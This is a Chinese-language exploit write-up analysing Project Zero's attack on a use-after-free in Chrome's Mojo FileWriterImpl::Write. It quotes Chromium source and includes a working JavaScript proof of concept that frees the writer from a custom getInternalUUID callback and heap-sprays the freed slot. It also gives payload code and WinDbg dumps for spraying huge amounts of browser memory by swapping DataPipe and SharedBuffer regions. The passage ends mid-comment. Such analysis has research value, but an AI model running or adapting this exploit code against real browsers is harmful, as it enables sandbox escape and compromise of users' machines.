## 环境搭建

下载一个70.0.3525.0 ~ 73.0.3676.0之间的应该都没啥问题，本人使用的是和p0文章里差不多版本的71.0.3578.0

## 前言

对p0给的exp做了一些分析

## 漏洞成因

该漏洞发生在Chrome的FileWriterImpl接口实现里

### file_writer.mojom

首先是FileWriter的IDL[接口描述](https://github.com/chromium/chromium/blob/71.0.3578.98/third_party/blink/public/mojom/filesystem/file_writer.mojom)：

```cpp
// src/third_party/blink/public/mojom/filesystem/file_writer.mojom
// Interface provided to the renderer to let a renderer write data to a file.
interface FileWriter {
 // Write data from |blob| to the given |position| in the file being written
 // to. Returns whether the operation succeeded and if so how many bytes were
 // written.
 // TODO(mek): This might need some way of reporting progress events back to
 // the renderer.
 Write(uint64 position, Blob blob) => (mojo_base.mojom.FileError result,
                                       uint64 bytes_written);    	// <---------bug here

 // Write data from |stream| to the given |position| in the file being written
 // to. Returns whether the operation succeeded and if so how many bytes were
 // written.
 // TODO(mek): This might need some way of reporting progress events back to
 // the renderer.
 WriteStream(uint64 position, handle<data_pipe_consumer> stream) =>
       (mojo_base.mojom.FileError result, uint64 bytes_written);

 // Changes the length of the file to be |length|. If |length| is larger than
 // the current size of the file, the file will be extended, and the extended
 // part is filled with null bytes.
 Truncate(uint64 length) => (mojo_base.mojom.FileError result);
};
```

### file_system.mojom

漏洞存在于Write的是实现里，而FileWriter是被[FileSystemManager](https://github.com/chromium/chromium/blob/71.0.3578.98/third_party/blink/public/mojom/filesystem/file_system.mojom#L231)管理的，其有一个CreateWriter方法，可以创建出FileWriter：

```cpp
// src/third_party/blink/public/mojom/filesystem/file_system.mojom
// Interface provided by the browser to the renderer to carry out filesystem
// operations. All [Sync] methods should only be called synchronously on worker
// threads (and asynchronously otherwise).
interface FileSystemManager {
 // ...

 // Creates a writer for the given file at |file_path|.
 CreateWriter(url.mojom.Url file_path) =>
     (mojo_base.mojom.FileError result,
      blink.mojom.FileWriter? writer);

 // ...
};
```

其接口具体的[实现](https://github.com/chromium/chromium/blob/71.0.3578.98/content/browser/fileapi/file_system_manager_impl.cc#L572)：

```cpp
// src/content/browser/fileapi/file_system_manager_impl.cc
void FileSystemManagerImpl::CreateWriter(const GURL& file_path,
                                         CreateWriterCallback callback) {
  DCHECK_CURRENTLY_ON(BrowserThread::IO);

  FileSystemURL url(context_->CrackURL(file_path));
  base::Optional<base::File::Error> opt_error = ValidateFileSystemURL(url);
  if (opt_error) {
    std::move(callback).Run(opt_error.value(), nullptr);
    return;
  }
  if (!security_policy_->CanWriteFileSystemFile(process_id_, url)) {
    std::move(callback).Run(base::File::FILE_ERROR_SECURITY, nullptr);
    return;
  }

  blink::mojom::FileWriterPtr writer;
  mojo::MakeStrongBinding(std::make_unique<storage::FileWriterImpl>(
                              url, context_->CreateFileSystemOperationRunner(),
                              blob_storage_context_->context()->AsWeakPtr()),
                          MakeRequest(&writer));					// [1]
  std::move(callback).Run(base::File::FILE_OK, std::move(writer));
}
```

从[1]处可以看到这里通过MakeStrongBinding来将FileWriterImpl实例和刚刚创建出来的receiver绑定到一起，StroingBinding意味着FileWriterImpl对象的生命周期和Mojo interface pointer绑定，这也代表着我们可以在连接的另一端控制该对象的生命周期。

### FileWriterImpl::Write

以下是漏洞函数FileWriterImpl::Write的具体[实现](https://github.com/chromium/chromium/blob/71.0.3578.98/storage/browser/fileapi/file_writer_impl.cc#L26)：

```cpp
void FileWriterImpl::Write(uint64_t position,
                           blink::mojom::BlobPtr blob,
                           WriteCallback callback) {
  blob_context_->GetBlobDataFromBlobPtr(
      std::move(blob),
      base::BindOnce(&FileWriterImpl::DoWrite, base::Unretained(this),	// <---- [2]
                     std::move(callback), position));
}
```

在[2]处指出了这里使用了base::Unretained(this)，base::Unretained这里表示被调者不保证对象的存在，由调用方来保证回调执行时，this指针仍然可用，此时还无法看出漏洞所在，继续跟进[blob_context_->GetBlobDataFromBlobPtr](https://github.com/chromium/chromium/blob/71.0.3578.98/storage/browser/blob/blob_storage_context.cc#L80)：

```cpp
// src/storage/browser/blob/blob_storage_context.cc
void BlobStorageContext::GetBlobDataFromBlobPtr(
    blink::mojom::BlobPtr blob,
    base::OnceCallback<void(std::unique_ptr<BlobDataHandle>)> callback) {
  DCHECK(blob);
  blink::mojom::Blob* raw_blob = blob.get();
  raw_blob->GetInternalUUID(mojo::WrapCallbackWithDefaultInvokeIfNotRun(
      base::BindOnce(
          [](blink::mojom::BlobPtr, base::WeakPtr<BlobStorageContext> context,
             base::OnceCallback<void(std::unique_ptr<BlobDataHandle>)> callback,
             const std::string& uuid) {
            if (!context || uuid.empty()) {
              std::move(callback).Run(nullptr);
              return;
            }
            std::move(callback).Run(context->GetBlobDataFromUUID(uuid));
          },		// lambda函数
          std::move(blob), AsWeakPtr(), std::move(callback)),
      ""));
}
```

FileWriterImpl::Write向其传入了一个用户可控的Blob（我们可以在js层构造一个BlobPtr传入）和FileWriterImpl::DoWrite的callback，BlobStorageContext::GetBlobDataFromBlobPtr调用了raw_blob->GetInternalUUID，由于BlobPtr可以由我们传入，所以GetInternalUUID也是对应我们自己定义好的js函数（这里没搞懂为什么有些对象的js函数是我们可以重写的），它只需要满足其[mojo idl](https://github.com/chromium/chromium/blob/71.0.3578.98/third_party/blink/public/mojom/blob/blob.mojom#L30)接口即可，将一个`string uuid`作为response返回，blob的mojom文件：

```cpp
// src/third_party/blink/public/mojom/blob/blob.mojom
// This interface provides access to a blob in the blob system.
interface Blob {
  // Creates a copy of this Blob reference.
  Clone(Blob& blob);

  // ....................................................
  // This method is an implementation detail of the blob system. You should not
  // ever need to call it directly.
  // This returns the internal UUID of the blob, used by the blob system to
  // identify the blob.
  GetInternalUUID() => (string uuid);
};
```

在调用完raw_blob->GetInternalUUID后，取得uuid，并通过该uuid作为`context->GetBlobDataFromUUID(uuid)`的参数拿到Blob对象并传给回调`base::BindOnce(&FileWriterImpl::DoWrite, base::Unretained(this),	std::move(callback), position));`作为其最后一个参数调用[FileWriterImpl::DoWrite](https://github.com/chromium/chromium/blob/71.0.3578.98/storage/browser/fileapi/file_writer_impl.cc#L62)：

```cpp
void FileWriterImpl::DoWrite(WriteCallback callback,
                             uint64_t position,
                             std::unique_ptr<BlobDataHandle> blob) {
  if (!blob) {
    std::move(callback).Run(base::File::FILE_ERROR_FAILED, 0);
    return;
  }

  // FileSystemOperationRunner assumes that positions passed to Write are always
  // valid, and will NOTREACHED() if that is not the case, so first check the
  // size of the file to make sure the position passed in from the renderer is
  // in fact valid.
  // Of course the file could still change between checking its size and the
  // write operation being started, but this is at least a lot better than the
  // old implementation where the renderer only checks against how big it thinks
  // the file currently is.
  operation_runner_->GetMetadata(
      url_, FileSystemOperation::GET_METADATA_FIELD_SIZE,
      base::BindRepeating(&FileWriterImpl::DoWriteWithFileInfo,
                          base::Unretained(this),
                          base::AdaptCallbackForRepeating(std::move(callback)),
                          position, base::Passed(std::move(blob))));
}
```

总结一下FileWriterImpl::Write的执行流程为：

`FileWriterImpl::Write` ---> `blob_context_->GetBlobDataFromBlobPtr` ---> `raw_blob->GetInternalUUID` ---> `context->GetBlobDataFromUUID(uuid)`  ---> `FileWriterImpl::DoWrite`

问题就出在raw_blob->GetInternalUUID这一步，由于GetInternalUUID是由我们自定义的，所以我们可以在GetInternalUUID的js实现中把FileWriterImpl释放掉，后续的FileWriterImpl::DoWrite就会重用我们释放掉的FileWriterImpl对象，导致UAF

触发UAF的poc代码：

```javascript
// 创建blob_registry_ptr和file_system_manager_ptr供后面使用
let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                   mojo.makeRequest(blob_registry_ptr).handle, "process");

let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                 mojo.makeRequest(file_system_manager_ptr).handle, "process");

// 注册一个uuid为'blob_0'的Blob
async function Blob0() {
  function BytesProviderImpl() {
    this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
  }

  let bytes_provider = new BytesProviderImpl();
  let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
  bytes_provider.binding.bind(mojo.makeRequest(bytes_provider_ptr));

  let blob_ptr = new blink.mojom.BlobPtr();
  let blob_req = mojo.makeRequest(blob_ptr);

  let data_element = new blink.mojom.DataElement();
  data_element.bytes = new blink.mojom.DataElementBytes();
  data_element.bytes.length = 1;
  data_element.bytes.embeddedData = [0];
  data_element.bytes.data = bytes_provider_ptr;

  await blob_registry_ptr.register(blob_req, 'blob_0', "text/html", "", [data_element]);
}

// 堆喷相关对象
function getAllocationConstructor() {
  let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
  Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                      mojo.makeRequest(blob_registry_ptr).handle, "process", true);

  function Allocation(size=280) {
  function ProgressClient(allocate) {
      function ProgressClientImpl() {
      }
      ProgressClientImpl.prototype = {
      onProgress: async (arg0) => {
          if (this.allocate.writePromise) {
          this.allocate.writePromise.resolve(arg0);
          }
      }
      };
      this.allocate = allocate;

      this.ptr = new mojo.AssociatedInterfacePtrInfo();
      var progress_client_req = mojo.makeRequest(this.ptr);
      this.binding = new mojo.AssociatedBinding(
      blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
      );

      return this;
  }

  this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
  this.progressClient = new ProgressClient(this);
  blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
      this.serialized_blob = res.blob;
  })

  this.malloc = async function(data) {
      promise = new Promise((resolve, reject) => {
      this.writePromise = {resolve: resolve, reject: reject};
      });
      this.pipe.producer.writeData(data);
      this.pipe.producer.close();
      written = await promise;
      console.assert(written == data.byteLength);
  }

  this.free = async function() {
      this.serialized_blob.blob.ptr.reset();
      await sleep(1000);
  }

  this.read = function(offset, length) {
      this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
      this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
      return new Promise((resolve) => {
      this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
          result = new ArrayBuffer(length);
          this.readpipe.consumer.readData(result);
          this.watcher.cancel();
          resolve(result);
      });
      });
  }

  this.readQword = async function(offset) {
      let res = await this.read(offset, 8);
      return (new DataView(res)).getBigUint64(0, true);
  }

  return this;
  }

  async function allocate(data) {
  let allocation = new Allocation(data.byteLength);
  await allocation.malloc(data);
  //await sleep(1000);
  return allocation;
  }
  return allocate;
}
async function heapSreay(allocator, data, size){
  return Promise.all(Array(size).fill().map(() => allocator(data)));
}

async function trigger(oob) {
  const kFileWriterImplSize = 0x140;
  const kAllocationCount = 0x88;

  let data = new Uint8Array(kFileWriterImplSize).fill(0x23).buffer;

  let allocate_ = getAllocationConstructor();

  let host_url = new url.mojom.Url();
  host_url.url = window.location.href;

  let open_result = await file_system_manager_ptr.open(host_url, 0);

  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/aaaa';

  var create_writer_result = await file_system_manager_ptr.createWriter(file_url);

  // 自定义实现BlobImpl
  function Blob0Impl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  Blob0Impl.prototype = {
    getInternalUUID: async (arg0) => {
      print('  [*] getInternalUUID');

      print('  [!] freeing FileWriterImpl');
      create_writer_result.writer.ptr.reset();			// 释放fileWriterimpl对象
      let heap = await heapSreay(allocate_,data,kAllocationCount);	// 堆喷

      Blob0();      // 注册一个uuid为blob_0的Blob

      print('  [*] FileWriterImpl::DoWrite');
      return {'uuid': 'blob_0'};
    }
  };

  let blob_impl = new Blob0Impl();
  let blob_impl_ptr = new blink.mojom.BlobPtr();
  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));

  create_writer_result.writer.write(0, blob_impl_ptr);		// 调用漏洞函数
}
```

## 漏洞利用

由于是UAF的漏洞，我们需要保证占位到被释放的FileWriterImpl后程序不会崩溃，但是跟入FileWriterImpl::DoWrite后会发现，里面会有一堆的对FileWriterImpl对象的成员的引用，在不知道任何堆地址的情况下几乎就是必挂。而p0的文章中使用到了一种喷射内存的手法，可以喷4Tb以上的内存，在喷了这么大的内存之后，就可以拿到一个稳定的地址，在该地址上布置好内存布局，我们就可以避免crash了！以下是如何实现该内存喷射的分析

### DataPipe和SharedBuffer

Mojo不仅有Message Pipe，其还提供了DataPipe和SharedBuffer，查看其[接口文件](https://github.com/chromium/chromium/blob/71.0.3578.98/third_party/blink/renderer/core/mojo/mojo.idl)：

```cpp
// src/third_party/blink/renderer/core/mojo/mojo.idl
[
    ContextEnabled=MojoJS,
    Exposed=(Window,Worker),
    RuntimeEnabled=MojoJS
] interface Mojo {

    static MojoCreateMessagePipeResult createMessagePipe();
    static MojoCreateDataPipeResult createDataPipe(MojoCreateDataPipeOptions options);
    static MojoCreateSharedBufferResult createSharedBuffer(unsigned long numBytes);

    [CallWith=ScriptState] static void bindInterface(DOMString interfaceName, MojoHandle request_handle, optional MojoScope scope = "context");
};
```

DataPipe分为consumer端和producer端，SharedBuffer是一块共享的内存；在windows平台的实现中，DataPipe和SharedBuffer的底层都是依赖windows的SharedMemory机制。

在DataPipeDispatcher的[Deserialize](https://github.com/chromium/chromium/blob/71.0.3578.98/mojo/core/data_pipe_consumer_dispatcher.cc#L361)方法中：

```cpp
// src/mojo/core/data_pipe_consumer_dispatcher.cc
// static
scoped_refptr<DataPipeConsumerDispatcher>
DataPipeConsumerDispatcher::Deserialize(const void* data,
                                        size_t num_bytes,
                                        const ports::PortName* ports,
                                        size_t num_ports,
                                        PlatformHandle* handles,
                                        size_t num_handles) {
  if (num_ports != 1 || num_handles != 1 ||
      num_bytes != sizeof(SerializedState)) {
    return nullptr;
  }

  const SerializedState* state = static_cast<const SerializedState*>(data);
  if (!state->options.capacity_num_bytes || !state->options.element_num_bytes ||
      state->options.capacity_num_bytes < state->options.element_num_bytes ||
      state->read_offset >= state->options.capacity_num_bytes ||
      state->bytes_available > state->options.capacity_num_bytes) {
    return nullptr;
  }

  NodeController* node_controller = Core::Get()->GetNodeController();
  ports::PortRef port;
  if (node_controller->node()->GetPort(ports[0], &port) != ports::OK)
    return nullptr;

  auto region_handle = CreateSharedMemoryRegionHandleFromPlatformHandles(
      std::move(handles[0]), PlatformHandle());
  auto region = base::subtle::PlatformSharedMemoryRegion::Take(
      std::move(region_handle),
      base::subtle::PlatformSharedMemoryRegion::Mode::kUnsafe,
      state->options.capacity_num_bytes,
      base::UnguessableToken::Deserialize(state->buffer_guid_high,
                                          state->buffer_guid_low));
  auto ring_buffer =
      base::UnsafeSharedMemoryRegion::Deserialize(std::move(region));
  if (!ring_buffer.IsValid()) {
    DLOG(ERROR) << "Failed to deserialize shared buffer handle.";
    return nullptr;
  }

  scoped_refptr<DataPipeConsumerDispatcher> dispatcher =
      new DataPipeConsumerDispatcher(node_controller, port,
                                     std::move(ring_buffer), state->options,
                                     state->pipe_id);

  {
    base::AutoLock lock(dispatcher->lock_);
    dispatcher->read_offset_ = state->read_offset;
    dispatcher->bytes_available_ = state->bytes_available;
    dispatcher->new_data_available_ = state->bytes_available > 0;
    dispatcher->peer_closed_ = state->flags & kFlagPeerClosed;
    if (!dispatcher->InitializeNoLock())				// <------- [3]
      return nullptr;
    if (state->options.capacity_num_bytes >
        dispatcher->ring_buffer_mapping_.mapped_size()) {
      return nullptr;
    }
    dispatcher->UpdateSignalsStateNoLock();
  }

  return dispatcher;
}
```

在[3]处，当Browser端接收到DataPipe consumer端的消息时，会在该函数中映射一段和render端一模一样，即大小一样内容一样的memory，如果我们能一直发送DataPipe的consumer端给Browser端，就可以依靠`dispatcher->InitializeNoLock`函数来喷射Browser端的内存；但是render进程是有内存限制的，要达到4Tb是不可能的；

在前面提到过SharedBuffer和DataPipe底层是使用同一个windows机制的，在翻看[mojo_handle](https://github.com/chromium/chromium/blob/71.0.3578.98/third_party/blink/renderer/core/mojo/mojo_handle.idl)的接口定义：

```cpp
// src/third_party/blink/renderer/core/mojo/mojo_handle.idl
interface MojoHandle {
    void close();
    [CallWith=ScriptState] MojoWatcher watch(MojoHandleSignals signals, MojoWatchCallback callback);

    // TODO(alokp): Create MojoMessagePipeHandle, a subclass of MojoHandle
    // and move the following member functions.
    MojoResult writeMessage(BufferSource buffer, sequence<MojoHandle> handles);
    MojoReadMessageResult readMessage(optional MojoReadMessageFlags flags);

    // TODO(alokp): Create MojoDataPipeProducerHandle and MojoDataPipeConsumerHandle,
    // subclasses of MojoHandle and move the following member functions.
    MojoWriteDataResult writeData(BufferSource buffer, optional MojoWriteDataOptions options);
    MojoReadDataResult queryData();
    MojoReadDataResult discardData(unsigned long numBytes, optional MojoDiscardDataOptions options);
    MojoReadDataResult readData(BufferSource buffer, optional MojoReadDataOptions options);

    // TODO(alokp): Create MojoSharedBufferHandle, a subclass of MojoHandle
    // and move the following member functions.
    MojoMapBufferResult mapBuffer(unsigned long offset, unsigned long numBytes);
    MojoCreateSharedBufferResult duplicateBufferHandle(optional MojoDuplicateBufferHandleOptions options);
};
```

可以发现我们是可以dup SharedBuffer的，所以我们可以利用这个dup的操作，在配合前面DataPipeDispatcher里映射内存的机制，得到内存喷射的步骤：

- 首先创建一个1G大小的SharedBuffer
- 接着创建大量的1kb的DataPipe和SharedBuffer的dup handle
- 找到全局变量mojo::core::Core* g_core
- 根据g_core的地址找到前面DataPipe和SharedBuffer的dispatcher对象
- 交换他们的region_成员并修改MojoCreateDataPipeOptions的element_num_bytes 和capacity_num_bytes
- 使用blob_registry_ptr.registerFromStream("", "", 0x1, pipes[i].consumer, null);来发送datapipe的consumer端
- browser端的mojo::core::DataPipeConsumerDispatcher::Deserialize函数会接收到render进程发过来的consumer，并进行大量1G的内存映射

与上面步骤中相关的结构体如下：

```cpp
0:020> dt chrome!mojo::core::Core
  +0x000 __VFN_table : Ptr64 
  +0x008 node_controller_lock_ : base::Lock
  +0x010 node_controller_ : std::__1::unique_ptr<mojo::core::NodeController,std::__1::default_delete<mojo::core::NodeController> >
  +0x018 default_process_error_callback_ : base::RepeatingCallback<void (const std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > &)>
  +0x020 handles_         : std::__1::unique_ptr<mojo::core::HandleTable,std::__1::default_delete<mojo::core::HandleTable> >
  +0x028 mapping_table_lock_ : base::Lock
  +0x030 mapping_table_   : std::__1::unordered_map<void *,std::__1::unique_ptr<mojo::core::PlatformSharedMemoryMapping,std::__1::default_delete<mojo::core::PlatformSharedMemoryMapping> >,std::__1::hash<void *>,std::__1::equal_to<void *>,std::__1::allocator<std::__1::pair<void *const,std::__1::unique_ptr<mojo::core::PlatformSharedMemoryMapping,std::__1::default_delete<mojo::core::PlatformSharedMemoryMapping> > > > >
      
      
0:022> dx -r1 ((chrome_child!mojo::core::Dispatcher *)0x26d70d047e0)
((chrome_child!mojo::core::Dispatcher *)0x26d70d047e0)                 : 0x26d70d047e0 [Type: mojo::core::DataPipeProducerDispatcher * (derived from mojo::core::Dispatcher *)]
    [+0x008] ref_count_       [Type: base::AtomicRefCount]
    [+0x010] options_         [Type: MojoCreateDataPipeOptions]
    [+0x020] node_controller_ : 0x26d6e51ee30 [Type: mojo::core::NodeController *]
    [+0x028] control_port_    [Type: mojo::core::ports::PortRef]
    [+0x040] pipe_id_         : 0x13883be7ad4703 [Type: unsigned __int64]
    [+0x048] lock_            [Type: base::Lock]
    [+0x050] watchers_        [Type: mojo::core::WatcherSet]
    [+0x080] shared_ring_buffer_ [Type: base::UnsafeSharedMemoryRegion]
    [+0x0a8] ring_buffer_mapping_ [Type: base::ReadOnlySharedMemoryMapping (derived from base::WritableSharedMemoryMapping)]
    [+0x0d8] in_transit_      : false [Type: bool]
    [+0x0d9] is_closed_       : false [Type: bool]
    [+0x0da] peer_closed_     : false [Type: bool]
    [+0x0db] peer_remote_     : false [Type: bool]
    [+0x0dc] transferred_     : false [Type: bool]
    [+0x0dd] in_two_phase_write_ : false [Type: bool]
    [+0x0e0] write_offset_    : 0x0 [Type: unsigned int]
    [+0x0e4] available_capacity_ : 0x1000 [Type: unsigned int]
    
0:022> dx -r1 (*((chrome_child!base::UnsafeSharedMemoryRegion *)0x26d70d04860))
(*((chrome_child!base::UnsafeSharedMemoryRegion *)0x26d70d04860))                 [Type: base::UnsafeSharedMemoryRegion]
    [+0x000] handle_          [Type: base::subtle::PlatformSharedMemoryRegion]

    
0:022> dx -r1 (*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d70d04860))
(*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d70d04860))                 [Type: base::subtle::PlatformSharedMemoryRegion]
    [+0x000] handle_          [Type: base::win::GenericScopedHandle<base::win::HandleTraits,base::win::VerifierTraits>]
    [+0x008] mode_            : kUnsafe | kMaxValue (2) [Type: base::subtle::PlatformSharedMemoryRegion::Mode]
    [+0x010] size_            : 0x1000 [Type: unsigned __int64]
    [+0x018] guid_            [Type: base::UnguessableToken]


0:022> dx -r1 (*((chrome_child!scoped_refptr<mojo::core::Dispatcher> *)0x26d066f9d28))
(*((chrome_child!scoped_refptr<mojo::core::Dispatcher> *)0x26d066f9d28))                 : [0xd491b880] 0x26d068599a0 {...} [Type: scoped_refptr<mojo::core::Dispatcher>]
    [<Raw View>]     [Type: scoped_refptr<mojo::core::Dispatcher>]
    Ptr              : 0x26d068599a0 [Type: mojo::core::Dispatcher *]
    RefCount         : 0xd491b880 [Type: unsigned int]
0:022> dx -r1 ((chrome_child!mojo::core::Dispatcher *)0x26d068599a0)
((chrome_child!mojo::core::Dispatcher *)0x26d068599a0)                 : 0x26d068599a0 [Type: mojo::core::SharedBufferDispatcher * (derived from mojo::core::Dispatcher *)]
    [+0x008] ref_count_       [Type: base::AtomicRefCount]
    [+0x010] lock_            [Type: base::Lock]
    [+0x018] in_transit_      : false [Type: bool]
    [+0x020] region_          [Type: base::subtle::PlatformSharedMemoryRegion]
    
0:022> dx -r1 (*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d068599c0))
(*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d068599c0))                 [Type: base::subtle::PlatformSharedMemoryRegion]
    [+0x000] handle_          [Type: base::win::GenericScopedHandle<base::win::HandleTraits,base::win::VerifierTraits>]
    [+0x008] mode_            : kUnsafe | kMaxValue (2) [Type: base::subtle::PlatformSharedMemoryRegion::Mode]
    [+0x010] size_            : 0x40000000 [Type: unsigned __int64]
    [+0x018] guid_            [Type: base::UnguessableToken]
```

其中最重要的就是他们的region\_成员，里面包含了handle和guid，这是Mojo用来识别DataPipe和SharedBuffer的，在payload代码中，我们就是交换了DataPipe和SharedBuffer的region\_以达到让Browser一次性map 1G内存的操作

以下是payload中相关的代码：

```javascript
function spray(oob, page_data) {
  print('[5] spray');

  const kPageSize     = 0x1000;
  const kHugePageSize = 0x40000000;			// 1G

  function get_mojo_handle(oob, object) {
    let object_ptr = oob.objToPtr(object);
    let object_handle_ptr = oob.getUint64(object_ptr + 0x20n);
    let object_handle = oob.getUint32(object_handle_ptr + 0x10n);
    return object_handle;
  }

  let shared_memory = Mojo.createSharedBuffer(kHugePageSize).handle;
  let shared_memory_handle = get_mojo_handle(oob, shared_memory);

  print('  [*] initializing shared memory');
  var page_view = new DataView(page_data);
  for (var i = 0; i < kHugePageSize / kPageSize; i += 1) {
    let shared_buffer = shared_memory.mapBuffer(i * kPageSize, kPageSize);
    let shared_view = new DataView(shared_buffer.buffer);
    for (var j = 0; j < kPageSize; j += 4) {
      shared_view.setUint32(j, page_view.getUint32(j));
    }
  }

  print('  [*] creating pipes and dupes');
  let pipes = [];
  let dupes = [];
  let pipe_handles = new Set([]);
  let dupe_handles = new Set([]);
  // create large of DataPipe and SharedBuffer's dup
  for (var i = 0; i < 0xc88; ++i) {
    let pipe = Mojo.createDataPipe({elementNumBytes: 0x1, capacityNumBytes: 0x1000});
    let dupe = shared_memory.duplicateBufferHandle();
    let pipe_handle = get_mojo_handle(oob, pipe.consumer);
    let dupe_handle = get_mojo_handle(oob, dupe.handle);

    pipes.push(pipe);
    dupes.push(dupe);
    pipe_handles.add(pipe_handle);
    dupe_handles.add(dupe_handle);
  }
  let mojo_core_ptr = oob.getUint64(chrome_child.base + kChromeChildCoreOffset);
  // this is the member handles_ of the mojo::Core object.
  let mojo_handles_ptr = oob.getUint64(mojo_core_ptr + 0x20n);

  // 0:020> dt chrome!mojo::core::Core
  //  +0x000 __VFN_table : Ptr64 
  //  +0x008 node_controller_lock_ : base::Lock
  //  +0x010 node_controller_ : std::__1::unique_ptr<mojo::core::NodeController,std::__1::default_delete<mojo::core::NodeController> >
  //  +0x018 default_process_error_callback_ : base::RepeatingCallback<void (const std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > &)>
  //  +0x020 handles_         : std::__1::unique_ptr<mojo::core::HandleTable,std::__1::default_delete<mojo::core::HandleTable> >
  //  +0x028 mapping_table_lock_ : base::Lock
  //  +0x030 mapping_table_   : std::__1::unordered_map<void *,std::__1::unique_ptr<mojo::core::PlatformSharedMemoryMapping,std::__1::default_delete<mojo::core::PlatformSharedMemoryMapping> >,std::__1::hash<void *>,std::__1::equal_to<void *>,std::__1::allocator<std::__1::pair<void *const,std::__1::unique_ptr<mojo::core::PlatformSharedMemoryMapping,std::__1::default_delete<mojo::core::PlatformSharedMemoryMapping> > > > >


  let pipe_dispatchers = [];
  let dupe_dispatchers = [];

  var list_node_ptr = oob.getUint64(mojo_handles_ptr + 0x10n);
  let list_length = oob.getUint64(mojo_handles_ptr + 0x18n);
  console.log("mojo_core_ptr: " + mojo_core_ptr.toString(16));
  console.log("mojo_handles_ptr: " + mojo_handles_ptr.toString(16));
  console.log("list_node_ptr: " + list_node_ptr.toString(16));
  console.log("list_length: " + list_length.toString(16));
  
  // find dispatcher
  for (var i = 0; i <= list_length; ++i) {
    let list_node_handle = oob.getUint32(list_node_ptr + 0x10n);
    let list_node_dispatcher = oob.getUint64(list_node_ptr + 0x18n);
    if (pipe_handles.has(list_node_handle)) {
      pipe_dispatchers.push(list_node_dispatcher);
    } else if (dupe_handles.has(list_node_handle)) {
      dupe_dispatchers.push(list_node_dispatcher);
    }
    list_node_ptr = oob.getUint64(list_node_ptr);
  }
//   0:022> dx -r1 ((chrome_child!mojo::core::Dispatcher *)0x26d70d047e0)
// ((chrome_child!mojo::core::Dispatcher *)0x26d70d047e0)                 : 0x26d70d047e0 [Type: mojo::core::DataPipeProducerDispatcher * (derived from mojo::core::Dispatcher *)]
//     [+0x008] ref_count_       [Type: base::AtomicRefCount]
//     [+0x010] options_         [Type: MojoCreateDataPipeOptions]
//     [+0x020] node_controller_ : 0x26d6e51ee30 [Type: mojo::core::NodeController *]
//     [+0x028] control_port_    [Type: mojo::core::ports::PortRef]
//     [+0x040] pipe_id_         : 0x13883be7ad4703 [Type: unsigned __int64]
//     [+0x048] lock_            [Type: base::Lock]
//     [+0x050] watchers_        [Type: mojo::core::WatcherSet]
//     [+0x080] shared_ring_buffer_ [Type: base::UnsafeSharedMemoryRegion]
//     [+0x0a8] ring_buffer_mapping_ [Type: base::ReadOnlySharedMemoryMapping (derived from base::WritableSharedMemoryMapping)]
//     [+0x0d8] in_transit_      : false [Type: bool]
//     [+0x0d9] is_closed_       : false [Type: bool]
//     [+0x0da] peer_closed_     : false [Type: bool]
//     [+0x0db] peer_remote_     : false [Type: bool]
//     [+0x0dc] transferred_     : false [Type: bool]
//     [+0x0dd] in_two_phase_write_ : false [Type: bool]
//     [+0x0e0] write_offset_    : 0x0 [Type: unsigned int]
//     [+0x0e4] available_capacity_ : 0x1000 [Type: unsigned int]
// 0:022> dx -r1 (*((chrome_child!base::UnsafeSharedMemoryRegion *)0x26d70d04860))
// (*((chrome_child!base::UnsafeSharedMemoryRegion *)0x26d70d04860))                 [Type: base::UnsafeSharedMemoryRegion]
//     [+0x000] handle_          [Type: base::subtle::PlatformSharedMemoryRegion]
// 0:022> dx -r1 (*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d70d04860))
// (*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d70d04860))                 [Type: base::subtle::PlatformSharedMemoryRegion]
//     [+0x000] handle_          [Type: base::win::GenericScopedHandle<base::win::HandleTraits,base::win::VerifierTraits>]
//     [+0x008] mode_            : kUnsafe | kMaxValue (2) [Type: base::subtle::PlatformSharedMemoryRegion::Mode]
//     [+0x010] size_            : 0x1000 [Type: unsigned __int64]
//     [+0x018] guid_            [Type: base::UnguessableToken]


// 0:022> dx -r1 (*((chrome_child!scoped_refptr<mojo::core::Dispatcher> *)0x26d066f9d28))
// (*((chrome_child!scoped_refptr<mojo::core::Dispatcher> *)0x26d066f9d28))                 : [0xd491b880] 0x26d068599a0 {...} [Type: scoped_refptr<mojo::core::Dispatcher>]
//     [<Raw View>]     [Type: scoped_refptr<mojo::core::Dispatcher>]
//     Ptr              : 0x26d068599a0 [Type: mojo::core::Dispatcher *]
//     RefCount         : 0xd491b880 [Type: unsigned int]
// 0:022> dx -r1 ((chrome_child!mojo::core::Dispatcher *)0x26d068599a0)
// ((chrome_child!mojo::core::Dispatcher *)0x26d068599a0)                 : 0x26d068599a0 [Type: mojo::core::SharedBufferDispatcher * (derived from mojo::core::Dispatcher *)]
//     [+0x008] ref_count_       [Type: base::AtomicRefCount]
//     [+0x010] lock_            [Type: base::Lock]
//     [+0x018] in_transit_      : false [Type: bool]
//     [+0x020] region_          [Type: base::subtle::PlatformSharedMemoryRegion]
// 0:022> dx -r1 (*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d068599c0))
